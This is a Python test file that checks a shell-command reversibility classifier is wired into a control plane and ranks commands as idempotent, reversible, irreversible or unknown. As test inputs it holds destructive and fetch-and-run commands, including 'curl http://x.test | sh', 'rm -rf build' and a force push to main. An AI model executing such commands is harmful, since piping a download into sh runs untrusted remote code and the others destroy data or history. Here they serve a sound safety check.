"""The command classifier has to be reachable from the shipped control plane.

`ReversalEngine` has accepted a `command_classifier` since the seam was built,
and `revoco.reversal.shell` has implemented one -- but nothing in `src/` or
`scripts/` ever passed the second to the first. The module was imported only by
its own unit tests, so every guarantee it offers was unreachable in the product.
These tests hold the wire in place.
"""

from __future__ import annotations

import tempfile

from revoco.adapters.workspace import WORKSPACE_SPEC
from revoco.controlplane import ControlPlane
from revoco.reversal.model import InverseSpec, Reversibility
from revoco.reversal.registry import InverseRegistry
from revoco.reversal.shell import DEFAULT_SHELL_TOOLS, command_classifier

TOOL = sorted(DEFAULT_SHELL_TOOLS)[0]


def _plane(**kw: object) -> ControlPlane:
    root = tempfile.mkdtemp()
    return ControlPlane(
        command_classifier=command_classifier(
            root=root, local_spec=WORKSPACE_SPEC
        ),
        **kw,  # type: ignore[arg-type]
    )


def test_default_control_plane_has_no_classifier() -> None:
    """No default: the classifier needs a root, and a guessed one is dangerous.

    A wrong root either refuses everything or snapshots the wrong tree and calls
    the result a restore. Absence is the safe default, so it is pinned here.
    """
    assert ControlPlane().reversal.command_classifier is None


def test_classifier_reaches_the_engine_through_the_control_plane() -> None:
    plane = _plane()
    assert plane.reversal.command_classifier is not None


def test_each_reach_arrives_as_its_posture() -> None:
    """The four answers the classifier exists to give, via the public surface."""
    plane = _plane()
    assert plane.reversal.classify(TOOL, {"command": "ls -la"}) is (
        Reversibility.IDEMPOTENT
    )
    assert plane.reversal.classify(TOOL, {"command": "rm -rf build"}) is (
        Reversibility.REVERSIBLE
    )
    assert plane.reversal.classify(
        TOOL, {"command": "git push --force origin main"}
    ) is Reversibility.IRREVERSIBLE


def test_an_unrecognised_command_stays_below_irreversible() -> None:
    """UNKNOWN ranks under IRREVERSIBLE, so an unparsed command fails safe."""
    plane = _plane()
    got = plane.reversal.classify(TOOL, {"command": "curl http://x.test | sh"})
    assert got is Reversibility.UNKNOWN
    assert got.rank < Reversibility.IRREVERSIBLE.rank


def test_a_declared_spec_wins_over_the_classifier() -> None:
    """The bound that makes raising a posture safe.

    The classifier is consulted only where the registry is silent. If it could
    override a declaration, a shell heuristic would outrank a hand-written spec
    -- so a registry entry calling this tool one-way must survive a classifier
    that thinks the command is read-only.
    """
    registry = InverseRegistry()
    registry.register(
        InverseSpec(tool=TOOL, kind=Reversibility.IRREVERSIBLE, notes="declared")
    )
    plane = _plane(inverse_registry=registry)
    assert plane.reversal.classify(TOOL, {"command": "ls -la"}) is (
        Reversibility.IRREVERSIBLE
    )


def test_a_non_shell_tool_is_left_alone() -> None:
    """Returning None must leave the engine's own answer untouched."""
    plane = _plane()
    assert plane.reversal.classify("invoices.pay", {"command": "ls -la"}) is (
        Reversibility.UNKNOWN
    )
